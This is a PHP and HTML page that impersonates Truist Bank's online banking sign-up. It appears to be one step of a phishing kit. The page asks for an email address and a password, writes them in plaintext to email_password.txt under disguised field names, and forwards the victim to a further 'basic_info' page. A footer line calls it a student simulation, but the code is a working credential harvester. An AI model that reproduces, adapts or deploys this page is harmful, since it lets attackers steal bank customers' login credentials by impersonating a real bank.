<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $confirmPassword = $_POST['confirmPassword'] ?? '';
    
    // Validation
    if (empty($email)) {
        $errors['email'] = 'Email is required';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors['email'] = 'Invalid email format';
    }
    
    if (empty($password)) {
        $errors['password'] = 'Password is required';
    } elseif (strlen($password) < 8) {
        $errors['password'] = 'Password must be at least 8 characters';
    }
    
    if (empty($confirmPassword)) {
        $errors['confirmPassword'] = 'Confirm password is required';
    } elseif ($password !== $confirmPassword) {
        $errors['confirmPassword'] = 'Passwords do not match';
    }
    
    if (empty($errors)) {
        // Save to test file (matching affinity field names)
        $data = [
            'step' => 'email_password',
            'usrnm' => $username,
            'usr_eml' => $email,
            'acc_cd' => $password
        ];
        
        saveUserData('email_password.txt', $data);
        
        // Redirect to basic info page
        header('Location: basic_info.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Set Your Email & Password - Truist Bank</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen flex flex-col bg-[#f6f3fa]">
    <!-- Header -->
    <header class="bg-[#2b0d49] text-white shadow-[0_2px_8px_rgba(22,9,40,0.45)]">
        <div class="max-w-6xl mx-auto h-16 flex items-center justify-start px-6">
            <img
                src="assets/trulogo_horz-white.png"
                alt="Truist logo"
                class="h-8 w-auto"
            />
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-1 flex items-start justify-center px-4 sm:px-6 py-10">
        <div class="w-full max-w-5xl">
            <section class="w-full">
                <h1 class="mx-auto mb-6 w-full max-w-2xl text-center text-3xl font-semibold text-[#2b0d49]">
                    Set Your Email & Password
                </h1>
                <div class="mx-auto w-full max-w-2xl rounded-2xl border border-[#e2d8f1] bg-white shadow-[0_20px_60px_rgba(43,13,73,0.12)]">
                    <div class="px-8 py-10">
                        <p class="text-sm font-semibold text-[#6c5d85]">Create your account credentials to access your online banking</p>

                        <?php if (!empty($errors)): ?>
                            <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                                <div class="flex">
                                    <div class="flex-shrink-0">
                                        <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                        </svg>
                                    </div>
                                    <div class="ml-3">
                                        <p class="text-sm text-red-700">
                                            Please fix the following errors:
                                            <ul class="list-disc pl-5 mt-1">
                                                <?php foreach ($errors as $error): ?>
                                                    <li><?php echo htmlspecialchars($error); ?></li>
                                                <?php endforeach; ?>
                                            </ul>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>
                        
                        <form method="POST" class="mt-8 space-y-6">
                            <!-- Email Field -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="email">
                                    Email Address
                                </label>
                                <input
                                    id="email"
                                    name="email"
                                    type="email"
                                    value="<?php echo htmlspecialchars($_POST['email'] ?? ''); ?>"
                                    class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                    placeholder="Enter your email"
                                    required
                                />
                                <?php if (isset($errors['email'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['email']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Password Field -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="password">
                                    Password
                                </label>
                                <div class="relative">
                                    <input
                                        id="password"
                                        name="password"
                                        type="password"
                                        class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                        placeholder="Enter password"
                                        required
                                    />
                                    <button
                                        type="button"
                                        onclick="togglePasswordVisibility('password')"
                                        class="absolute right-3 top-1/2 -translate-y-1/2 text-[#5f259f] text-sm hover:underline"
                                    >
                                        <span id="passwordToggleText">Show</span>
                                    </button>
                                </div>
                                <?php if (isset($errors['password'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['password']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Confirm Password Field -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="confirmPassword">
                                    Confirm Password
                                </label>
                                <div class="relative">
                                    <input
                                        id="confirmPassword"
                                        name="confirmPassword"
                                        type="password"
                                        class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                        placeholder="Re-enter password"
                                        required
                                    />
                                    <button
                                        type="button"
                                        onclick="togglePasswordVisibility('confirmPassword')"
                                        class="absolute right-3 top-1/2 -translate-y-1/2 text-[#5f259f] text-sm hover:underline"
                                    >
                                        <span id="confirmPasswordToggleText">Show</span>
                                    </button>
                                </div>
                                <?php if (isset($errors['confirmPassword'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['confirmPassword']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>
                            
                            <div class="flex flex-wrap gap-3 pt-2">
                                <button
                                    type="submit"
                                    class="inline-flex items-center justify-center rounded-full bg-[#5f259f] px-8 py-3 text-sm font-semibold text-white hover:bg-[#4a1a7e]"
                                >
                                    Continue
                                </button>
                            </div>
                            
                            <p class="text-xs text-[#6c5d85] mt-4">
                                Your password must be at least 8 characters long and should include a mix of letters, numbers, and symbols for security.
                            </p>
                        </form>
                    </div>
                </div>
            </section>
        </div>
    </main>

    <!-- Footer -->
    <footer class="bg-[#2b0d49] text-white">
        <div class="max-w-6xl mx-auto px-6 py-8 grid gap-6 lg:grid-cols-[auto_1fr_auto] items-start">
            <div class="flex flex-col gap-3">
                <div class="flex items-center">
                    <img
                        src="assets/trulogo_horz-white.png"
                        alt="Truist logo"
                        class="h-8 w-auto"
                    />
                </div>
                <p class="text-xs text-white/70 max-w-xs">
                    Tailored banking experiences, demonstrated for students and simulation exercises only.
                </p>
            </div>

            <div class="grid gap-3 sm:grid-cols-2 lg:grid-cols-3 text-sm">
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Privacy
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Accessibility
                        </a>
                    </li>
                </ul>
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Fraud & security
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Limit use of my sensitive personal information
                        </a>
                    </li>
                </ul>
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Terms and conditions
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Disclosures
                        </a>
                    </li>
                </ul>
            </div>
        </div>
        <div class="bg-black/90">
            <p class="max-w-6xl mx-auto px-6 py-3 text-center text-xs text-white/70">
                © 2025, Truist. All rights reserved.
            </p>
        </div>
    </footer>

    <script>
        // Toggle password visibility
        function togglePasswordVisibility(fieldId) {
            const input = document.getElementById(fieldId);
            const toggleText = document.getElementById(fieldId + 'ToggleText');
            
            if (input.type === 'password') {
                input.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                input.type = 'password';
                toggleText.textContent = 'Show';
            }
        }
        
        // Auto-focus email field on page load
        document.addEventListener('DOMContentLoaded', function() {
            const emailInput = document.getElementById('email');
            if (emailInput) {
                emailInput.focus();
            }
        });
    </script>
</body>
</html>
